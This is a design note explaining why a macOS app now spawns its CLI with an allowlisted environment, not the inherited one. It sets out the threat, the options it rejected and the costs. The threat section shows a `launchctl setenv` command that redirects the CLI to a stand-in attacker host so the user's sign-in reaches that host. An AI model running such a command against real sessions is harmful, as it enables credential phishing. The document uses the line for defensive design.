# The child environment is an allowlist, not the app's own

Every spawn used to start from `ProcessInfo.processInfo.environment` and overlay the app's extras on it, so anything exported into the session the app was launched from reached the CLI. It no longer does. The child gets four inherited keys and nothing else, `TMPDIR`, `LANG`, `LC_ALL` and `LC_CTYPE`; `HOME` and `PATH` are pinned rather than copied; the caller's extras go on top; and `HEY_NONINTERACTIVE` is settled last. `HOME` comes from `FileManager`, which reads the user record rather than `$HOME`, and is the same value the spawn already used as its working directory. `PATH` is pinned to `/usr/bin:/bin:/usr/sbin:/sbin`. The rule lives in `ChildEnvironment` so it is one function the tests can hold to a full dictionary equality, rather than a few lines inside the spawn builder.

The threat is that the CLI takes its most important settings from the environment. `HEY_BASE_URL` and `HEY_CABLE_URL` decide which host it talks to, `HEY_TOKEN` and `HEY_AT` hand it credentials, `HEY_NO_KEYRING` moves the ones it has out of the keychain and into a plaintext file, and `HEY_CACHE_DIR` and `HEY_OAUTH_CLIENT_ID` move the rest of the flow. `XDG_CONFIG_HOME` and `HOME` carry the same weight without the prefix: the CLI resolves its config directory as `$XDG_CONFIG_HOME/hey-cli` or else `$HOME/.config/hey-cli`, and that config file has a `base_url` key of its own, so a home folder somebody else chose is a host somebody else chose. None of this needs malware with a debugger. `launchctl setenv HEY_BASE_URL https://hey.attacker.example` writes the GUI session's environment, and every app the user launches from then on inherits it, ours included.

What makes it worse than a redirected read is the sign in that follows. The CLI keys its keychain item on the base URL, so a redirected host finds no credentials there and reports the user as signed out. The app does exactly what it is built to do with that: it offers a sign in, the user takes it, and the sign in runs against the attacker's host with the user's real HEY password. A leak of what is already stored is bad; walking the user into typing their credentials into somebody else's login page is worse, and it is the outcome the old code allowed.

The caller's extras are still honoured verbatim, `HEY_*` keys included, and that is deliberate rather than an oversight. The inherited environment is ambient state anybody who can run `launchctl setenv` can write. The caller is the app itself, which already chose the executable it spawns and the account selection it spawns with, and is not a party the package needs to defend against. So the allowlist is a floor under what an app gets by accident, never a ceiling on what it can ask for on purpose.

## Considered options

- Keep inheriting the whole environment and write the risk down. Rejected. The apps are launched from Finder and their users have no reason to audit their session's variables, so the risk would be documented for the one person who does not need the documentation.
- Deny the `HEY_*` prefix and inherit everything else. Rejected. It has to stay right about a list that belongs to the CLI and grows in versions the package was never built against, and even today it misses `HOME`, `XDG_CONFIG_HOME`, the proxy variables and `GODEBUG`, each of which carries as much weight as the prefixed ones. A denylist fails open; an allowlist fails closed.
- Hand the child an empty environment. Rejected. Login opens the sign in page with a bare `open` that Go resolves by searching, so a child with no `PATH` could not reach a browser, and the child would lose its locale and its temp directory for nothing.
- Make the policy a setting the app chooses. Rejected. A default nobody can get wrong is worth more than a knob, and the escape hatch already exists: an app that needs a variable passes it through `environment:`.

## What it costs

The proxy variables are no longer inherited. A user behind a proxy that the CLI needs told about does not get it from their shell any more, and the app has to pass `HTTP_PROXY` or `HTTPS_PROXY` through `environment:` for them. That is the cost of the escape hatch existing rather than a gap in it.

`SSL_CERT_FILE` and `SSL_CERT_DIR` are excluded too, and excluding them protects nothing. On macOS the CLI's `crypto/x509` reads the Security framework trust store and ignores both variables, so a certificate pointed at through them was never being honoured in the first place. This is recorded so that nobody later adds them to the allowlist for parity with Linux and believes they have loosened a protection, or removes something else believing they have tightened one.

A maintainer whose terminal exports `XDG_CONFIG_HOME` now has one config directory in the terminal and another in the app, which means a different install id, a different onboarding state and a different saved account default between the two. The sign in itself is still shared, because the token lives in the keychain rather than in that directory. It is also not a change: an app launched from Finder never saw that variable anyway, since it is exported by a shell profile the launch never reads. The difference only appears for an app started from the terminal, which is a developer's habit rather than a user's.

The pinned `PATH` is the same value launchd hands a Finder launched app, so for the way the apps are actually started nothing changes at all. What changes is that an app launched from a shell that prepended a directory to `PATH` no longer lets that directory decide which `open` a sign in runs. The keyring is unaffected either way: the CLI's macOS provider invokes `/usr/bin/security` by absolute path and never searches for it.
